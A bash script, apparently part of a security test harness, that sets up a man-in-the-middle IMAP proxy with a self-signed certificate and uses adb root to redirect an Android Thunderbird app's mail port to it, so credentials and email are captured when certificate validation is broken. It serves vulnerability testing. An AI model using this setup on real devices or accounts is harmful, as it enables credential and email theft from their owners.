#!/usr/bin/env bash
# =============================================================================
# prepare_app.sh — Set up MITM infrastructure for CWE-295 exploitation
# =============================================================================
# Inserts a TLS MITM IMAP proxy between the Android emulator and the real
# mail server. The proxy uses a self-signed certificate that is NOT trusted
# by the system CA store.
#
# On the vulnerable app (checkServerTrusted is a no-op), the connection
# succeeds and the proxy captures IMAP credentials + email content.
#
# On the clean app, the TLS handshake fails because the certificate is
# rejected, and no data is captured.
# =============================================================================
set -euo pipefail

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
PREPARE_FILES="$SCRIPT_DIR/prepare_files"

MITM_CONTAINER="thunderbird-mitm"
MITM_PORT=1993
MITM_HTTP_PORT=8082

log(){ printf '[prepare_app] %s\n' "$*"; }

# ── Step 1: Clean up any previous MITM container ─────────────────────────────
log "Removing stale MITM container (if any)..."
docker rm -f "$MITM_CONTAINER" 2>/dev/null || true

# ── Step 2: Generate self-signed certificate for MITM ────────────────────────
CERT_DIR="$SCRIPT_DIR/prepare_files/certs"
mkdir -p "$CERT_DIR"

log "Generating self-signed MITM certificate..."
openssl req -x509 -newkey rsa:2048 \
    -keyout "$CERT_DIR/mitm-key.pem" \
    -out "$CERT_DIR/mitm-cert.pem" \
    -days 1 -nodes \
    -subj "/CN=mitm-attacker.evil" 2>/dev/null

# ── Step 3: Start the MITM proxy container ───────────────────────────────────
log "Starting MITM IMAP proxy container..."
docker run -d \
    --name "$MITM_CONTAINER" \
    --network shared_net \
    -p "${MITM_PORT}:993" \
    -p "${MITM_HTTP_PORT}:8082" \
    -v "$PREPARE_FILES/mitm_imap_proxy.py:/app/proxy.py:ro" \
    -v "$CERT_DIR:/certs:ro" \
    -e REAL_IMAP_HOST=thunderbird-app \
    -e REAL_IMAP_PORT=993 \
    -e LISTEN_PORT=993 \
    -e HTTP_PORT=8082 \
    -e CERT_FILE=/certs/mitm-cert.pem \
    -e KEY_FILE=/certs/mitm-key.pem \
    python:3.11-slim \
    python3 /app/proxy.py

# Wait for the proxy to be ready
sleep 2
if ! docker ps --format '{{.Names}}' | grep -q "$MITM_CONTAINER"; then
    log "ERROR: MITM container failed to start"
    docker logs "$MITM_CONTAINER" 2>&1 | tail -20
    exit 1
fi
log "MITM proxy container is running"

# ── Step 4: Redirect app's IMAP connection to the MITM proxy ─────────────────
# Modify Thunderbird's stored IMAP server settings to use the MITM port
# directly. This is more reliable than iptables DNAT which does not survive
# QEMU SLiRP translation in the Android emulator.
PACKAGE="net.thunderbird.android"
DB="/data/data/${PACKAGE}/databases/preferences_storage"

log "Switching to root for database modification..."
adb root 2>/dev/null && sleep 2

log "Force-stopping Thunderbird to release database locks..."
adb shell am force-stop "$PACKAGE" 2>/dev/null || true
sleep 1

# Write SQL to a temp file to avoid shell-escaping issues
TMPFILE=$(mktemp)
cat > "$TMPFILE" << ENDSQL
UPDATE preferences_storage
   SET value = replace(replace(value,
       '"port":993',  '"port":${MITM_PORT}'),
       '"port": 993', '"port": ${MITM_PORT}')
 WHERE primkey LIKE '%incomingServerSettings';
ENDSQL
adb push "$TMPFILE" /data/local/tmp/update_imap_port.sql >/dev/null
rm -f "$TMPFILE"

log "Updating IMAP port from 993 → ${MITM_PORT} in preferences database..."
adb shell "sqlite3 '${DB}' < /data/local/tmp/update_imap_port.sql"

# Verify the change took effect
UPDATED=$(adb shell "sqlite3 '${DB}' \"SELECT value FROM preferences_storage WHERE primkey LIKE '%incomingServerSettings';\"" 2>/dev/null || true)
if echo "$UPDATED" | grep -q "\"port\":${MITM_PORT}\|\"port\": ${MITM_PORT}"; then
    log "IMAP port successfully updated to ${MITM_PORT}"
else
    log "WARNING: Could not verify IMAP port update. Current value: ${UPDATED}"
fi

# Drop back to non-root
adb unroot 2>/dev/null || true
sleep 1

log "MITM infrastructure ready"
